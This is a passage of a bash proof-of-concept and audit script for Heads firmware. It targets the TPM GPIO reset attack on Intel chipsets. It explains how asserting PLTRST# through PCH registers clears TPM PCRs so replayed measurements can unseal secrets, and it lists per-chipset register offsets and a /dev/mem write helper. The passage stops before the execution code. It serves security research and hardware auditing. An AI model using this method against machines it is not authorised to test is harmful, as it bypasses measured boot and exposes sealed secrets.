#!/bin/bash
# SPDX-License-Identifier: GPL-2.0-only
#
# TPM GPIO Reset Attack -- Proof of Concept / Audit Tool
#
# ============================================================================
# WHAT THIS SCRIPT DEMONSTRATES
# ============================================================================
#
# The TPM GPIO reset attack exploits a design flaw on certain Intel PCH
# platforms where the PLTRST# (Power Loss Timer Reset) signal to the TPM
# can be asserted from userspace through PCH sideband registers.
#
# Two mechanisms exist, both accessed via PCR (Private Configuration Register)
# MMIO space:
#
#   CNP-LP (T480s): PLTRST_CPU_B is on a multi-function GPIO pad (pad 256,
#   COM3). The pad is reprogrammed from native function to GPIO output mode,
#   driven low (assert reset), then the original mode is restored.
#
#   SPT/KBP (T480) and ADL/RPL: Write 0x80000000 to the PAD_CFG DW0 register
#   at a platform-specific PCR address. This asserts PLTRST# at the PCH level
#   without changing the pad's GPIO mode.
#
# By asserting PLTRST#, the attacker can reset the TPM without power cycling
# the platform, clearing all PCRs to their initial (all-zero) state while the
# CPU and memory contents remain intact.
#
# After reset, if the attacker can replay the PCR extend operations from a
# saved measurement log, the TPM will present the expected PCR values and
# unseal the TOTP/HOTP secrets -- effectively bypassing the
# measured boot trust chain.
#
# Attack vector: The measurement logs (cbmem -L, /tmp/measuring_trace.log)
# are accessible from the Heads recovery shell. An unauthenticated recovery
# shell provides all the information needed to replay PCR measurements.
# Configuring GPG authentication for the recovery shell
# (CONFIG_BOOT_RECOVERY_GPG=) prevents this.
#
# ============================================================================
# AFFECTED PLATFORMS
# ============================================================================
#
# Three classes of platforms based on PCH generation:
#
# 1. Cannon Point LP (CNP-LP) -- Kaby Lake-R / Whiskey Lake / Comet Lake (300-series)
#    PLTRST_CPU_B is mapped as a GPP pad inside the GPIO community and can
#    be toggled directly from userspace. UNTESTED -- no hardware verification.
#    kukri's PoC does not support this PCH family.
#
#      * ThinkPad T480s, T490, T495, X390, etc. (device ID 0x9d84)
#      * PLTRST_CPU_B = pad 256, GPIO community 3 (PID_GPIOCOM3 = 0x6b)
#      * Offset within community: 149 (first pad of comm 3 is HDA_BCLK = 107)
#
# 2. Skylake/Kaby Lake PCH (SPT/KBP) -- 6th/7th gen mobile/desktop
#    GPP_B13 drives PLTRST# via GPIO PAD_CFG at PCR port 0xaf,
#    COMM_0, local idx 13. PAD_CFG_BASE = 0x400.
#    This method IS IMPLEMENTED here. UNTESTED -- no hardware verification.
#
#      * ThinkPad T480 (KBL), T470, X270, T460, X260, etc.
#
# 3. Alder Lake / Raptor Lake PCH (ADL/RPL) -- 12th/13th/14th gen
#    GPP_B13 drives PLTRST# via GPIO PAD_CFG at PCR port 0x6d
#    (ADL-S/RPL-S, COMM_1) or 0x6e (ADL-P mobile, COMM_0).
#    All variants use local idx 13 with PAD_CFG_BASE = 0x700.
#    This method IS IMPLEMENTED here. TESTED on NV4x ADL-P: write verified, PCRs do not clear -- mechanism NOT confirmed working.
#
#      * NovaCustom NV4x ADL, Nitropad NS50, MSI Z790-P DDR5, etc.
#
# 4. Pre-Skylake (Sandy Bridge, Ivy Bridge, Haswell, Broadwell)
#    The PLTRST# signal to the TPM is a dedicated pin that cannot be
#    reprogrammed to GPIO mode by software. NOT AFFECTED.
#    This classification is based on Intel PCH architecture documentation --
#    no hardware testing has confirmed that pre-SKL PLTRST# pins are not
#    GPIO-multiplexed on any die stepping. Community verification welcomed.
#
# 5. Meteor Lake (MTL)
#    GPIO lock is functional on these platforms. NOT AFFECTED.
#
# ============================================================================
# REFERENCES
# ============================================================================
#
#   [1] mkukri.xyz -- "TPM GPIO fail: The Forgotten Bus"
#       https://mkukri.xyz/2024/06/01/tpm-gpio-fail.html
#       Original discovery and detailed analysis by mkukri.
#
#   [2] kukrimate/tpm-gpio-fail (GitHub) -- GPL-2.0 PoC tools
#       https://github.com/kukrimate/tpm-gpio-fail
#       Contains the original `detect` and `reset` tools this Heads
#       PoC script is conceptually based on. The `reset` directory
#       provides platform-specific data (PCH device IDs, PCR ports,
#       pad offsets, GPIO community definitions in inteltool.h) that
#       informed the platform database in this script.
#       https://github.com/kukrimate/tpm-gpio-fail/tree/main/reset
#
#   [3] coreboot ticket #576 -- "PLTRST_CPU_B pad should be locked
#       to prevent userspace TPM GPIO reset"
#       https://ticket.coreboot.org/issues/576
#       Tracking the coreboot-side fix: lock the pad config after
#       initialization to prevent runtime reprogramming.
#
#   [4] linuxboot/heads PR #1568 -- "scripts: add TCPA log replay support"
#       https://github.com/linuxboot/heads/pull/1568
#       Added TCPA/TPM event log replay to Heads (later moved to tpmr.sh
#       calcfuturepcr). This script delegates measurement replay to the
#       same tpmr.sh infrastructure.
#
# ============================================================================
# DISCLAIMER
# ============================================================================
#
# This script is provided for AUDITING, EDUCATIONAL, and RESEARCH purposes
# ONLY. It demonstrates a known vulnerability so that:
#   - Platform owners can verify whether their hardware is affected
#   - Developers can test mitigation patches
#   - The community can audit and improve platform security
#
# Misuse of this script to bypass security measures on systems you do not
# own or have explicit authorization to test is illegal and unethical.
#
# ============================================================================

# Heads initrd script. Uses bash for /dev/mem access via dd.
# Sources /etc/functions.sh for standard logging functions (INFO, WARN, DIE,
# STATUS, STATUS_OK, DEBUG, NOTE).
#
# NOTE: On ADL-P platforms (NovaCustom NV4x, Nitropad NS50), the P2SB bridge
# is hidden by FSP-S firmware. The GPIO pad config registers at 0xFD000000+
# are accessible via /dev/mem if CONFIG_STRICT_DEVMEM=n (Heads default), but
# the PADCFGLOCK register may block writes to GPP_B13. If the register value
# after write differs from the expected value, see the PADCFGLOCK and
# PADCFGLOCKTX debug output for lock status.

set -eo pipefail

# shellcheck source=/dev/null
. /etc/functions.sh

# ---- Named constants ---------------------------------------------------

GPIO_ASSERT_VALUE=0x80000000
GPIO_NF1_VALUE=0x40000401
TPM_NVRAM_TOTP_INDEX=0x4d47
DEFAULT_PCR_ALGO="sha256"
ESPI_CHECK_PORT=0xC7
PADCFGLOCK_STRIDE=8

# ---- Global variables -------------------------------------------------

SCRIPT_NAME="${0##*/}"

# Platform detection is via PCI device ID of the ISA/LPC bridge (class 0x0601).
# Mechanism-specific parameters (GPIO pad numbers, PCR ports, etc.) are
# hardcoded in the detect_platform() case statement below.

# ---- Helper functions (thin wrappers around Heads logging) ------------

# Print a section header using STATUS
section() {
	TRACE_FUNC
	STATUS "======================================================================"
	STATUS "  $*"
	STATUS "======================================================================"
}

# Read a 32-bit value from physical memory via /dev/mem
# Usage: mem_read32 <hex-address>
# Returns: decimal value
mem_read32() {
	TRACE_FUNC
	_addr="$1"
	# BusyBox does not ship od (CONFIG_OD=n). Use xxd which is available.
	dd if=/dev/mem bs=4 count=1 skip="$(( _addr / 4 ))" 2>/dev/null | xxd -p
}

# Write a 32-bit value to physical memory via /dev/mem (32-bit aligned write).
# Usage: mem_write32 <hex-address> <hex-value>
# Verifies write with readback — WARNs on mismatch.
mem_write32() {
	TRACE_FUNC
	_addr="$1"
	_val="$2"
	_skip=$(( _addr / 4 ))
	DEBUG "mem_write32 addr=0x$(printf '%x' $_addr) val=0x$(printf '%x' $_val)"
	# Write 4 bytes in little-endian order via printf '%b' with \xHH escapes.
	# Each byte is a separate printf argument to safely pass NUL bytes.
	printf '%b' \
		"\\x$(printf '%02x' $(( _val & 0xff )))" \
		"\\x$(printf '%02x' $(( (_val >> 8) & 0xff )))" \
		"\\x$(printf '%02x' $(( (_val >> 16) & 0xff )))" \
		"\\x$(printf '%02x' $(( (_val >> 24) & 0xff )))" | \
	dd of=/dev/mem bs=4 count=1 seek="$_skip" 2>/dev/null
	# Verify: read back the 4 bytes — xxd -p outputs bytes in LE memory order
	_read=$(dd if=/dev/mem bs=4 count=1 skip="$_skip" 2>/dev/null | xxd -p | tr -d '\n ')
	DEBUG "  readback: 0x$_read"
	# xxd outputs LE bytes (e.g. 0x80000000 -> "00000080"). Rearrange for comparison.
	_expected_le=$(printf '%02x' $(( _val & 0xff )))$(printf '%02x' $(( (_val >> 8) & 0xff )))$(printf '%02x' $(( (_val >> 16) & 0xff )))$(printf '%02x' $(( (_val >> 24) & 0xff )))
	if [ "$_read" != "$_expected_le" ]; then
		DEBUG "  MMIO write mismatch at 0x$(printf '%x' $_addr): wrote 0x$(printf '%08x' $_val), read 0x$_read (likely locked by PADCFGLOCK)"
	fi
}



# ---- Attack explanation header ----------------------------------------

print_banner() {
	TRACE_FUNC
	section "TPM GPIO RESET ATTACK -- Proof of Concept / Platform Audit Tool"
	INFO "  This tool checks whether your platform is affected by the TPM GPIO"
	INFO "  reset attack (coreboot ticket #576, mkukri.xyz 2024-06-01)."
	INFO ""
	INFO "  --audit, -a    Safe audit: detect platform, report vulnerability"
	INFO "  --execute,--exec,-x  Perform GPIO hardware reset and measurement replay"
	INFO "  --help,-h      Show this help"
}

# Compact header for audit mode (after platform detection)
print_audit_header() {
	TRACE_FUNC
	INFO "TPM GPIO Reset Audit -- platform: $GLOBAL_PCH ($_dev_id)"
}

# ---- Platform detection -----------------------------------------------
#
# Platform detection uses the PCI device ID of the ISA/LPC bridge (class
# 0x0601, typically device 00:1f.0 on Intel platforms).  This is reliable
# across all Linux kernels and does not depend on CONFIG_BOARD or DMI data.

_resolve_platform() {
	TRACE_FUNC
	_dev_id=""
	_dev_name=""

	# Find ISA/LPC bridge (class 0x0601) via sysfs
	for _dev in /sys/bus/pci/devices/*/; do
		[ -r "${_dev}class" ] || continue
		_class=$(cat "${_dev}class" 2>/dev/null)
		if [ "${_class%??}" = "0x0601" ]; then
			_dev_id=$(cat "${_dev}device" 2>/dev/null)
			_vendor=$(cat "${_dev}vendor" 2>/dev/null)
			_dev_name=$(cat "${_dev}device" 2>/dev/null)
			DEBUG "Matched ISA bridge: vendor=$_vendor device=$_dev_id class=$_class"
			break
		fi
	done

	if [ -z "$_dev_id" ] || [ "$_vendor" != "0x8086" ]; then
		DEBUG "No Intel ISA/LPC bridge found (device='$_dev_id' vendor='$_vendor')"
		WARN "  No Intel ISA/LPC bridge found (class 0x0601)."
		GLOBAL_PCH="UNKNOWN"
		return
	fi

	INFO "  ISA bridge device ID: $_dev_id"
	DEBUG "  ISA bridge: vendor $_vendor device $_dev_id"

	# Match device ID against known PCH families.
	# Device IDs from kukrimate/tpm-gpio-fail reset/inteltool.c and
	# coreboot src/soc/intel/ headers.
	case "$_dev_id" in
		# Sunrise Point (SPT) -- Skylake (6th gen), VULNERABLE
		# GPP_B13 is global pad 37 (GPP_A0=0..23, GPP_B0=24, GPP_B13=37)
		# port=0xaf PAD_CFG_BASE=0x400
		0xa143|0xa144|0xa145|0xa146|0xa147|0xa148|0xa149|0xa14a|0xa14d|0xa14e|0xa150|0xa152|0xa153|0xa154)
			GLOBAL_PCH="SPT_KBP"
			COMMUNITY_PORT=0xaf; PLTRST_PAD=37; FIRST_PAD=0
			PAD_CFG_BASE=0x400; NUM_PAD_CFG_REGS=2
			DEBUG "SPT (Skylake 6th gen) device=$_dev_id pad=37 port=0xaf" ;;
		# Comet Lake Desktop (CML-DT) -- B460, H410, H470, Z490 (10th gen desktop), VULNERABLE
		# GPP_B13 (COMM_0, local idx 13) port=0xaf PAD_CFG_BASE=0x400
		# PADCFGLOCK at offset 0xA8 (same as SPT global). Same port as SPT but different PCH generation.
		0x0684|0x0685|0x0686|0x0687|0x0688|0x0689|0x068a|0x068b|0x068c|0x068d|0x068e|0x068f)
			GLOBAL_PCH="CML_DT"
			COMMUNITY_PORT=0xaf; PLTRST_PAD=37; FIRST_PAD=0
			PAD_CFG_BASE=0x400; NUM_PAD_CFG_REGS=2
			DEBUG "CML-DT (Comet Lake Desktop 10th gen) device=$_dev_id pad=37 port=0xaf" ;;
		# Kaby Point (KBP) -- Kaby Lake (7th gen), VULNERABLE
		# GPP_B13 is global pad 37 port=0xaf PAD_CFG_BASE=0x400
		0xa2c4|0xa2c5|0xa2c6|0xa2c7|0xa2c8|0xa2c9|0xa2ca|0xa2d2)
			GLOBAL_PCH="SPT_KBP"
			COMMUNITY_PORT=0xaf; PLTRST_PAD=37; FIRST_PAD=0
			PAD_CFG_BASE=0x400; NUM_PAD_CFG_REGS=2
			DEBUG "KBP (Kaby Lake 7th gen) device=$_dev_id pad=37 port=0xaf" ;;
		# Tiger Lake (TGL) -- 11th gen mobile/desktop, VULNERABLE
		# PADCFGLOCK at offset 0x80 per Intel doc 834810.
		# Device IDs from coreboot/src/soc/intel/tigerlake/
		0xa082|0xa083|0xa084|0xa085|0xa086|0xa087|0xa088|0xa089|0xa08a|0xa08b|0xa08c|0xa08d|0xa08e|0xa08f|0xa0a0|0xa0a1|0xa0a2|0xa0a3|0xa0a4|0xa0a5|0xa0a6|0xa0a7)
			GLOBAL_PCH="TGL"
			COMMUNITY_PORT=0x6e; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "TGL (Tiger Lake 11th gen) device=$_dev_id port=0x6e pad=13" ;;
		# Coffee Lake S/H (CFL-S) -- Z390, H310, H370, B360, Q370, C242, C246 (8th/9th gen desktop), VULNERABLE
		# GPP_B13 (COMM_0, local idx 13) port=0x6e PAD_CFG_BASE=0x600
		# PADCFGLOCK at offset 0x88 per Intel doc 834810.
		0xa303|0xa304|0xa305|0xa306|0xa307|0xa308|0xa309|0xa30a|0xa30b|0xa30c|0xa30d|0xa30e)
			GLOBAL_PCH="CFL_S"
			COMMUNITY_PORT=0x6e; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x600; NUM_PAD_CFG_REGS=4
			DEBUG "CFL-S (Coffee Lake S/H) device=$_dev_id port=0x6e pad=13" ;;
		# Comet Lake U (CML-U) -- 10th gen mobile (400-series PCH), VULNERABLE
		# GPP_B13 (COMM_0, local idx 13) port=0x6e PAD_CFG_BASE=0x600
		# Has PADCFGLOCK at offset 0x88 (different from CNP-LP which has none).
		# Device IDs per Intel doc 834810.
		0x0660|0x0661)
			GLOBAL_PCH="CML_U"
			COMMUNITY_PORT=0x6e; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x600; NUM_PAD_CFG_REGS=4
			DEBUG "CML-U (Comet Lake U 10th gen) device=$_dev_id port=0x6e pad=13" ;;
		# Cannon Point LP (CNP-LP) -- Kaby Lake-R / Whiskey Lake / Comet Lake U (300-series), VULNERABLE
		# GPP_B13 (COMM_0, local idx 38) port=0x6e PAD_CFG_BASE=0x600
		# No PADCFGLOCK register exists on CNL-LP -- pad_cfg_lock_offset=0.
		# UNTESTED -- kukri's PoC does not support this PCH family.
		# Some Comet Lake U steppings (0x9d8* range) have PADCFGLOCK at 0x88.
		# Only 0x9d84 (CNP-LP proper) is confirmed to lack the register.
		0x9d84|0x9d85|0x9d86|0x9d87|0x9d88|0x9d89|0x9d8a|0x9d8b|0x9d8c|0x9d8d|0x9d8e|0x9d8f)
			GLOBAL_PCH="CNP_LP"
			COMMUNITY_PORT=0x6e; PLTRST_PAD=38; FIRST_PAD=0
			PAD_CFG_BASE=0x600; NUM_PAD_CFG_REGS=4
			DEBUG "CNP-LP (Cannon Point LP) device=$_dev_id port=0x6e pad=38 dw0_offset=0x$(printf '%x' $(( 0x600 + 38*16 )))" ;;
		# Alder Lake-P (mobile) -- ADL-P, VULNERABLE
		# GPP_B13 (COMM_0, local idx 13) port=0x6e PAD_CFG_BASE=0x700 LOCK_BASE=0x80
		0x5180|0x5181|0x5182|0x5183|0x5184|0x5185|0x5186|0x5187|0x5188|0x5189|0x518a|0x518b|0x518c|0x518d|0x518e|0x518f)
			GLOBAL_PCH="ADL_P"
			COMMUNITY_PORT=0x6e; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "ADL-P (mobile 12th gen) device=$_dev_id port=0x6e offset=0x7D0" ;;
		# Raptor Lake-P (mobile) -- RPL-P, VULNERABLE
		# GPP_B13 (COMM_0, local idx 13) port=0x6d PAD_CFG_BASE=0x700 LOCK_BASE=0x110
		0x5190|0x5191|0x5192|0x5193|0x5194|0x5195|0x5196|0x5197|0x5198|0x5199|0x519a|0x519b|0x519c|0x519d|0x519e|0x519f)
			GLOBAL_PCH="RPL_P"
			COMMUNITY_PORT=0x6d; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "RPL-P (mobile 13th gen) device=$_dev_id port=0x6d offset=0x7D0" ;;
		# Alder Lake-S (desktop) -- ADL-S, VULNERABLE
		# GPP_B13 (COMM_1, local idx 13) port=0x6d PAD_CFG_BASE=0x700 LOCK_BASE=0x110
		0x7a80|0x7a81|0x7a82|0x7a83|0x7a84|0x7a85|0x7a86|0x7a87|0x7a88|0x7a89|0x7a8a|0x7a8b|0x7a8c)
			GLOBAL_PCH="ADL_S"
			COMMUNITY_PORT=0x6d; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "ADL-S (desktop 12th gen) device=$_dev_id port=0x6d offset=0x7D0" ;;
		# Meteor Lake (MTL) -- Core Ultra Series 1+, NOT VULNERABLE
		# Functional GPIO lock via SOC_INTEL_COMMON_BLOCK_GPIO_LOCK_USING_PCR.
		# PCH device IDs from coreboot src/soc/intel/meteorlake/ (GPL-2.0).
		0x7e00|0x7e01|0x7e02|0x7e03|0x7e04|0x7e05|0x7e06|0x7e07)
			GLOBAL_PCH="MTL"
			DEBUG "MTL (Meteor Lake) device=$_dev_id -- functional GPIO lock" ;;
		# Raptor Lake-S (desktop) -- RPL-S, VULNERABLE
		# GPP_B13 (COMM_1, local idx 13) port=0x6d PAD_CFG_BASE=0x700 LOCK_BASE=0x110
		0x7a0c|0x7a0d|0x7a0e|0x7a0f|0x7a10|0x7a11|0x7a12|0x7a13|0x7a14|0x7a15|0x7a16|0x7a17)
			GLOBAL_PCH="RPL_S"
			COMMUNITY_PORT=0x6d; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "RPL-S (desktop 13th/14th gen) device=$_dev_id port=0x6d offset=0x7D0" ;;
		# Arrow Lake S (ARL-S) -- 15th gen desktop, VULNERABILITY UNCERTAIN
		# GPP_B13 (COMM_1, local idx 13) port=0x6d PAD_CFG_BASE=0x700
		# PADCFGLOCK at offset 0x120 per Intel doc 834810.
		0x7e20|0x7e21|0x7e22|0x7e23|0x7e24|0x7e25|0x7e26|0x7e27|0x7e28|0x7e29|0x7e2a|0x7e2b|0x7e2c|0x7e2d|0x7e2e|0x7e2f)
			GLOBAL_PCH="ARL_S"
			COMMUNITY_PORT=0x6d; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "ARL-S (Arrow Lake S 15th gen) device=$_dev_id port=0x6d offset=0x7D0" ;;
		*)
			GLOBAL_PCH="UNKNOWN"
			DEBUG "Device ID $_dev_id not in known PCH tables" ;;
	esac
	DEBUG "Device ID $_dev_id resolved to GLOBAL_PCH=$GLOBAL_PCH"

	GLOBAL_DEV_ID="$_dev_id"
	DEBUG "Final platform: GLOBAL_PCH=$GLOBAL_PCH COMMUNITY_PORT=$(printf "0x%x" $COMMUNITY_PORT 2>/dev/null)"
}

detect_platform() {
	TRACE_FUNC
	section "1. PLATFORM DETECTION"

	_resolve_platform
	DEBUG "detect_platform: GLOBAL_PCH=$GLOBAL_PCH NOT_VULNERABLE=$NOT_VULNERABLE"

	case "$GLOBAL_PCH" in
		MTL)
			STATUS_OK "Detected PCH: Meteor Lake (device $GLOBAL_DEV_ID)"
			INFO "  Meteor Lake has functional GPIO lock -- NOT VULNERABLE"
			INFO "  to the TPM GPIO reset attack."
			NOT_VULNERABLE="y"
			DEBUG "MTL platform: setting NOT_VULNERABLE=y" ;;
		PRE_SKL)
			STATUS_OK "Detected PCH: Pre-Skylake (device $GLOBAL_DEV_ID)"
			INFO "  Pre-Skylake platforms have a dedicated PLTRST pin that"
			INFO "  cannot be reprogrammed via GPIO. NOT VULNERABLE."
			NOT_VULNERABLE="y"
			DEBUG "PRE_SKL platform: setting NOT_VULNERABLE=y" ;;
		CML_U)
			STATUS_OK "Detected PCH: Comet Lake U (CML-U) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, COMM_0, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  PADCFGLOCK offset: 0x88 (Intel doc 834810)" ;;
		CNP_LP)
			STATUS_OK "Detected PCH: Cannon Point LP (CNP-LP) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (PLTRST_CPU_B pad 256, COMM_3, local idx $((PLTRST_PAD - FIRST_PAD)))"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  UNTESTED -- kukri's PoC does not support CNP-LP. Community testing needed." ;;
		SPT_KBP)
			STATUS_OK "Detected PCH: Skylake/Kaby Lake (SPT/KBP) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, COMM_0, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)" ;;
		CML_DT)
			STATUS_OK "Detected PCH: Comet Lake Desktop (CML-DT) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, COMM_0, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  PADCFGLOCK offset: 0xA8 (Intel doc 834810)" ;;
		TGL)
			STATUS_OK "Detected PCH: Tiger Lake (TGL) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, COMM_0, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  PADCFGLOCK offset: 0x80 (Intel doc 834810)" ;;
		CFL_S)
			STATUS_OK "Detected PCH: Coffee Lake S/H (CFL-S) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, COMM_0, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  PADCFGLOCK offset: 0x88 (Intel doc 834810)" ;;
		ADL_P)
			STATUS_OK "Detected PCH: Alder Lake-P (mobile 12th gen) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  PADCFGLOCK offset: 0x80 (bit 13 per coreboot gpio_defs.h)" ;;
		RPL_P)
			STATUS_OK "Detected PCH: Raptor Lake-P (mobile 13th gen) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  PADCFGLOCK offset: 0x110 (bit 13 per coreboot gpio_defs_pch_s.h)" ;;
		ADL_S|RPL_S)
			STATUS_OK "Detected PCH: Alder/Raptor Lake-S (desktop) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  PADCFGLOCK offset: 0x110 (bit 13 per coreboot gpio_defs_pch_s.h)" ;;
		ARL_S)
			STATUS_OK "Detected PCH: Arrow Lake S (ARL-S) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)"
			INFO "  PADCFGLOCK offset: 0x120 (Intel doc 834810)" ;;
		UNKNOWN)
			DEBUG "Unknown platform GLOBAL_PCH=UNKNOWN, showing help"
			DEBUG ""
			WARN "Platform not recognized — unknown PCI device $GLOBAL_DEV_ID"
			DEBUG ""
			INFO "  This script detects Intel PCH families by ISA/LPC bridge PCI device ID:"
			INFO "  - SPT (0xa14*) Skylake:      GPP_B13 port=0xaf, PADCFGLOCK 0xA8"
			INFO "  - KBP (0xa2c*) Kaby Lake:    GPP_B13 port=0xaf, PADCFGLOCK 0xA8"
			INFO "  - CML-DT (0x0684-0x068f) Comet Lake Desktop: GPP_B13 port=0xaf, PADCFGLOCK 0xA8"
			INFO "  - TGL (0xa08*/0xa0a*) Tiger Lake: GPP_B13 port=0x6e, PADCFGLOCK 0x80"
			INFO "  - CML_U (0x0660-0x0661) Comet Lake U: GPP_B13 port=0x6e, PADCFGLOCK 0x88"
			INFO "  - CFL_S (0xa303-0xa30e) Coffee Lake S/H: GPP_B13 port=0x6e, PADCFGLOCK 0x88"
			INFO "  - CNP-LP (0x9d84) Cannon Pt LP:  PLTRST_CPU_B port=0x6b, no PADCFGLOCK register"
			INFO "  - ADL-P (0x518*) 12th gen:   GPP_B13 port=0x6e, PADCFGLOCK 0x80"
			INFO "  - RPL-P (0x519*) 13th gen:   GPP_B13 port=0x6d, PADCFGLOCK 0x110"
			INFO "  - ADL-S (0x7a8*) 12th gen:   GPP_B13 port=0x6d, PADCFGLOCK 0x110"
			INFO "  - RPL-S (0x7a0*) 13th gen:   GPP_B13 port=0x6d, PADCFGLOCK 0x110"
			INFO "  - ARL-S (0x7e2*) Arrow Lake: GPP_B13 port=0x6d, PADCFGLOCK 0x120"
			INFO "  - MTL (0x7e00-0x7e07) Core Ultra 1+: GPIO lock infrastructure compiled, per-pad enforcement unconfigured"
			DEBUG ""
			PLATFORM_UNKNOWN="y"
			DEBUG "Setting PLATFORM_UNKNOWN=y" ;;
	esac

	# ---- 3-tier vulnerability classification for audit mode ----
	if [ "$AUDIT_MODE" = "y" ] && [ "$PLATFORM_UNKNOWN" != "y" ]; then
		STATUS "  VULNERABILITY CLASSIFICATION"
		case "$GLOBAL_PCH" in
		SPT_KBP|CML_DT)
				INFO "  TIER 1 -- VULNERABLE (confirmed): SPT/KBP/CML-DT (T480, M900, B460, etc.)"
				INFO "  Mechanism confirmed working by kukri. Pad unlocked, attack feasible." ;;
			TGL)
				INFO "  TIER 2 -- VULNERABLE (unconfirmed): TGL (Tiger Lake 11th gen)"
				INFO "  PADCFGLOCK at 0x80 per Intel doc, BUT no community test data."
				INFO "  Community testing needed." ;;
			CFL_S)
				INFO "  TIER 2 -- VULNERABLE (unconfirmed): CFL-S (Z390, H310, etc.)"
				INFO "  PADCFGLOCK at 0x88 per Intel doc 834810, BUT no community test data."
				INFO "  Community testing needed." ;;
			CML_U)
				INFO "  TIER 2 -- VULNERABLE (unconfirmed): CML-U (Comet Lake U 10th gen)"
				INFO "  PADCFGLOCK at 0x88 per Intel doc, BUT no community test data."
				INFO "  Community testing needed." ;;
			CNP_LP)
				INFO "  TIER 2 -- VULNERABLE (unconfirmed): CNP-LP (T480s)"
				INFO "  Pad unlocked, mechanism theoretically works but NO hardware test data exists."
				INFO "  kukri's PoC does not support this PCH family. Community testing needed." ;;
			ADL_P|RPL_P)
				INFO "  TIER 3 -- VULNERABILITY UNCERTAIN: ADL-P 0x5182 (NV4x, NS50), RPL-P"
				INFO "  GPIO lock is absent, writes verified, but PLTRST# assertion NOT confirmed"
				INFO "  on this PCH die. PCRs remain non-zero after toggle on NV4x ADL-P."
				INFO "  Physical scope verification needed. May not be electrically connected." ;;
			ADL_S|RPL_S|ARL_S)
				INFO "  TIER 3 -- VULNERABILITY UNCERTAIN: ADL-S/RPL-S/ARL-S desktop"
				INFO "  GPIO lock is absent, writes verified, but PLTRST# assertion NOT confirmed"
				INFO "  on these desktop PCH dies. Community testing needed." ;;
			MTL)
				INFO "  NOT VULNERABLE -- MTL (V540TU/V560TU):"
				INFO "  PCR GPIO lock Kconfig selected, FSP PchUnlockGpioPads=1."
				INFO "  eSPI-connected TPM (Infineon SLB 9672). GPIO PLTRST# manipulation"
				INFO "  does not apply to eSPI/LPC-connected TPMs." ;;
			PRE_SKL)
				INFO "  NOT VULNERABLE -- Pre-Skylake (T420, T430, X220, X230, etc.):"
				INFO "  Dedicated PLTRST# hardware pin. No GPIO vector exists." ;;
		esac
	fi

	DEBUG "detect_platform: POST case: MECHANISM=$MECHANISM PLATFORM_UNKNOWN=$PLATFORM_UNKNOWN"

	# Bail early for non-vulnerable platforms
	if [ "$NOT_VULNERABLE" = "y" ]; then
		DEBUG "NOT_VULNERABLE=y: exiting early with status 0"
		STATUS "  This platform is NOT vulnerable to the TPM GPIO reset attack."
		INFO "  Exiting."
		exit 0
	fi
}

# ---- Register address calculation -------------------------------------

calculate_registers() {
	TRACE_FUNC
